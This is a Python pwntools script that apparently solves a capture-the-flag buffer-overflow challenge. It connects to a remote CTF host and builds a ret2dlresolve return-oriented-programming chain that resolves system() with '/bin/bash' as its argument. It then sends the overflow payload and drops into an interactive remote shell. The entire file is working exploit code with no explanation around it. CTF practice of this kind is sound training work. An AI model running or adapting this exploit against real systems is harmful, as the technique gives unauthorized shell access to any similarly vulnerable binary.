from pwn import *

# context.terminal = ['termite', 'splitw', '-h']
exe = ELF("/home/alessio/Scrivania/tools/CTFs/batpwn/Basic BOF/bof")
context.binary = exe
HOST = "challenges.ctfd.io"
PORT = 30096
p = remote(HOST, PORT)

print("[+] Exploiting...")
# Build the Ret2dlResolve payload with parameter exe (binary), the symbol "system" and the args for system("/bin/sh")
rop = ROP(exe)
dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/bash"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
# Print the rop chain
print(rop.dump())
payload = fit({0x80 + context.bytes: raw_rop, 0x150: dlresolve.payload})

# Send payload to host
p.sendline(payload)
# Spawn an interactive shell
p.interactive()
